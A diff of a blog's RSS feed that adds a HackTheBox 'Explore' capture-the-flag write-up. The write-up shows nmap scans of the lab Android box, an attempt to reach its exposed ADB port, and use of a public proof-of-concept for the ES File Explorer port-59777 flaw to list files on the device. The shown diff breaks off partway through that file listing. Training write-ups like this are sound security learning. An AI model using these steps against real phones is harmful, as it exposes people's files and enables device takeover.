@@ -17,10 +17,440 @@
         
         
         
-        <lastBuildDate>Sat, 07 Aug 2021 22:20:51 &#43;0300</lastBuildDate>
+        <lastBuildDate>Sat, 30 Oct 2021 14:47:40 &#43;0300</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://netuserdoomdesire.github.io/rss.xml" />
         
+        
+            <item>
+                <title>Explore Writeup (HackTheBox)</title>
+                <link>https://netuserdoomdesire.github.io/posts/writeups/explore/</link>
+                <guid isPermaLink="true">https://netuserdoomdesire.github.io/posts/writeups/explore/</guid>
+                <pubDate>Sat, 30 Oct 2021 10:00:00 &#43;0300</pubDate>
+                
+                
+                
+                    <description>&lt;h1 id=&#34;explore-writeup-hackthebox&#34;&gt;Explore Writeup (HackTheBox)&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/1.png&#34; alt=&#34;Pasted image 20211019155500.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/356&#34;&gt;https://www.hackthebox.eu/home/machines/profile/356&lt;/a&gt;
+Explore is an easy HackTheBox Android device created by &lt;strong&gt;bertolis&lt;/strong&gt; (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27897)&#34;&gt;https://www.hackthebox.eu/home/users/profile/27897)&lt;/a&gt;. We begin with finding an &lt;strong&gt;Android ES File Explorer&lt;/strong&gt; vulnerability, in which user data are exposed, making us able to get user&amp;rsquo;s credentials from a screenshot on the device. From there we can get access on the device via ssh. We then abuse the fact that &lt;strong&gt;Android Debug Bridge&lt;/strong&gt; (&lt;strong&gt;ADB&lt;/strong&gt;) is enabled on the device in order to get a privileged shell.&lt;/p&gt;
+&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
+&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
+&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV 10.10.10.247 -oN explore.nmap
+Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-27 08:07 EDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.247
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.086s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
+PORT     STATE    SERVICE VERSION
+2222/tcp open     ssh     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NULL: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    SSH-2.0-SSH Server - Banana Studio
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+5555/tcp filtered freeciv
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2222-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;6/27%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;60D86A06%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NU
+SF:LL,24,&lt;span class=&#34;s2&#34;&gt;&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 11.63 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;-sC&lt;/strong&gt;: Scan with the default scripts&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;-sV&lt;/strong&gt;: Probe open ports to determine service/version info.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;-oN&lt;/strong&gt;: Save the nmap output on the designated file in normal format.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;investigating-port-2222&#34;&gt;Investigating port 2222&lt;/h1&gt;
+&lt;p&gt;From the output of nmap we can observe that this port is &lt;strong&gt;ssh&lt;/strong&gt;. More specifically, the version enumeration flag of nmap informs us that this is &lt;strong&gt;SSH-2.0-SSH Server - Banana Studio&lt;/strong&gt;. This was interesting so googling for &lt;strong&gt;Banana Studio ssh&lt;/strong&gt;, reveals us that this is an Android application, which means we have to deal with an Android box. Nevertheless, this is no different than any other ssh client, which means it&amp;rsquo;s a dead end for now since we have no valid username or password to work with.&lt;/p&gt;
+&lt;h1 id=&#34;investigating-port-5555&#34;&gt;Investigating port 5555&lt;/h1&gt;
+&lt;p&gt;Moving to port 5555, it states to be filtered. As stated on the nmap page, the filtering could be from a dedicated firewall device, router rules, or host-based firewall software. Further googling about how port 5555 is related to Android devices, brought me to &lt;a href=&#34;https://doublepulsar.com/root-bridge-how-thousands-of-internet-connected-android-devices-now-have-no-security-and-are-b46a68cb0f20&#34;&gt;this&lt;/a&gt; article. It appears that multiple Android devices are getting shipped with Android Debug Bridge (ADB) enabled. ADB allows developers to communicate with a device remotely without the need to authenticate in order to run a variety of commands, including running shell commands as the highest prileged user, root.  Since this appears to be the case it is very possible that by connecting to this port, will give us root access to the device. To connect to this port we will need &lt;strong&gt;android-tools-adb&lt;/strong&gt; which do not come pre-installed with Kali Linux. To install them we run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;apt-get install android-tools-adb
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;At this point we need to connect to this port with &lt;code&gt;adb&lt;/code&gt;. To do this we run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adb connect 10.10.10.247:5555
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This command hangs for a while and then eventually times out. It seems that this port is indeed filtered which means we won&amp;rsquo;t be able connect to it. It is something to keep in mind since it&amp;rsquo;s a way to get root on the device according to the article, however it is a dead end for the time being.&lt;/p&gt;
+&lt;h1 id=&#34;scanning-for-all-ports&#34;&gt;Scanning for all ports&lt;/h1&gt;
+&lt;p&gt;Since nmap default port scan returned 2 ports that got us nowhere, a full port scan was the following step:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -p- 10.10.10.247 -oN explorer.all-ports
+Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-27 08:10 EDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.247
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.083s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65530&lt;/span&gt; closed ports
+PORT      STATE    SERVICE
+2222/tcp  open     EtherNetIP-1
+5555/tcp  filtered freeciv
+37103/tcp open     unknown
+42135/tcp open     unknown
+59777/tcp open     unknown
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Scanning for all ports reveals 2 more ports we can enumerate (since port 37103 appears to be closed):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sV -p 2222,5555,37103,42135,59777 10.10.10.247 -oN explorer.all-ports 
+Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-27 11:23 EDT
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.247
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.091s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT      STATE    SERVICE VERSION
+2222/tcp  open     ssh     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+5555/tcp  filtered freeciv
+37103/tcp closed   unknown
+42135/tcp open     http    ES File Explorer Name Response httpd
+59777/tcp open     http    Bukkit JSONAPI httpd &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Minecraft game server 3.6.0 or older
+&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2222-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;6/27%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;60D897F3%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NU
+SF:LL,24,&lt;span class=&#34;s2&#34;&gt;&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+Service Info: Device: phone
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 12.45 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;enumerating-port-59777&#34;&gt;Enumerating port 59777&lt;/h1&gt;
+&lt;p&gt;While searching online for information about port 42135 brought no results, searching for port 59777 instantly brought results. The result of the search was &lt;a href=&#34;https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port&#34;&gt;this&lt;/a&gt; article which describes a vulnerability where Android ES File Explorer exposes user data through the open port 59777. This vulnerability, discovered by a security researcher named &lt;a href=&#34;https://twitter.com/fs0c131y/status/1085460755313508352&#34;&gt;Baptiste Robert&lt;/a&gt; allows anyone connected to the same local network to remotely get a file from the device using ES File Explorer. Moreover, a POC python script can also be found &lt;a href=&#34;https://github.com/fs0c131y/ESFileExplorerOpenPortVuln&#34;&gt;here&lt;/a&gt;. It seems this is our way of listing the device&amp;rsquo;s files.&lt;/p&gt;
+&lt;h1 id=&#34;using-the-script-to-list-files&#34;&gt;Using the script to list files&lt;/h1&gt;
+&lt;p&gt;Following the instructions on the script&amp;rsquo;s page, it seems that the script&amp;rsquo;s usage is the following:
+&lt;code&gt;poc.py --cmd &#39;command&#39; --host target_ip&lt;/code&gt;
+There are multiple commands available to the script, however the most useful appear to be &lt;strong&gt;listFiles&lt;/strong&gt; and &lt;strong&gt;listPics&lt;/strong&gt;.
+The first command to try was listFiles:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python poc.py --cmd listFiles --host 10.10.10.247 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep file
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vndservice_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;65.00 Bytes (65 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_service_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_seapp_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_property_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;392.00 Bytes (392 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_hwservice_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_file_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6.92 KB (7,081 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;ueventd.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;5.00 KB (5,122 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;ueventd.android_x86_64.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;464.00 Bytes (464 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
